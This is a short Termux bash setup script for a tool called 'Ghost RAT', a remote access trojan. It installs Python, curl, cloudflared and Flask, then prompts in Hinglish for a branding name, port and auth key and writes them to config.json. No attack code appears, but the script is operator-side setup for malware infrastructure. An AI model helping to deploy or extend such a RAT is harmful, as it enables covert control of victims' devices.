#!/data/data/com.termux/files/usr/bin/bash
# Ghost RAT - Setup - Developed Adibhai

set -e
cd "$(dirname "$0")"

echo ""
echo "============================================================"
echo "  GHOST RAT — Setup"
echo "============================================================"
echo ""

echo "[*] Checking packages..."
for pkg in python curl cloudflared; do
    if ! command -v $pkg > /dev/null 2>&1; then
        echo "[!] $pkg missing — installing"
        pkg install $pkg -y
    fi
done

echo "[*] Installing python deps..."
pip install flask --quiet

echo ""
read -p "Apna naam (branding ke liye) [Adibhai]: " USERNAME
USERNAME=${USERNAME:-Adibhai}

read -p "Port number [8443]: " PORT
PORT=${PORT:-8443}

read -p "AUTH_KEY (khali chhodo to auto-generate): " AUTH_KEY
if [ -z "$AUTH_KEY" ]; then
    AUTH_KEY=$(head -c 32 /dev/urandom | base64 | tr -d '/+=' | head -c 32)
    echo "[*] Auto-generated AUTH_KEY: $AUTH_KEY"
fi

cat > config.json <<EOF
{
  "username": "$USERNAME",
  "port": $PORT,
  "auth_key": "$AUTH_KEY"
}
EOF

echo ""
echo "============================================================"
echo "  Setup complete"
echo "============================================================"
echo "  Naam:       $USERNAME"
echo "  Port:       $PORT"
echo "  AUTH_KEY:   $AUTH_KEY"
echo ""
echo "  Ab chalao:  bash start.sh"
echo ""
